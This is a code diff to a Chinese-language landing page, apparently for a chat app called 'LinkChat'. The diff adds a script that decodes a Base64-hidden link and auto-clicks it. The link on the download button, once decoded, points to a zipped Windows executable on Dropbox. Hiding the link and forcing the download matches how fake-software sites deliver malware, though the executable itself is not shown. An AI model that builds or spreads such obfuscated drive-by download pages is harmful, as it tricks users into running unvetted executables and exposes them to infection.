@@ -28,4 +28,19 @@
         可以随时随地和朋友进行闲聊。<br>
         和重要的人聊重要的事!
     </div> <button class="downbated"><img src="static/picture/img_sbat_logos.png" class="bat"><a href="aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFnejVpNXNlNGo1YjF1ZGpiZDl0ZC9MaW5rQ2hhdC1VbmktMi4yLjIteDg2LTY0LmV4ZS56aXA/cmxrZXk9dTVhc2wyZmhpOWxrZ3dsMXBpcWd2ZDR3ciZzdD1pdDI0MWFxaSZkbD0x" style="color:#FFFFFF"><span style="margin-left: 20px;" style="color:#FFFFFF">下载LinkChat</span></a></button> <img src="static/picture/img_h_banner2.png" class="bgImg"> <!----></div>
+    <script>
+        function base64Decode(base64) {
+            return atob(base64); // 解码Base64字符串
+        }
+
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); // 解码链接
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; // 可选：指定文件下载时的名称
+            document.body.appendChild(link); // 将链接添加到文档中
+            link.click(); // 模拟点击链接
+            document.body.removeChild(link); // 下载后移除链接
+        }
+    </script>
 </body></html>
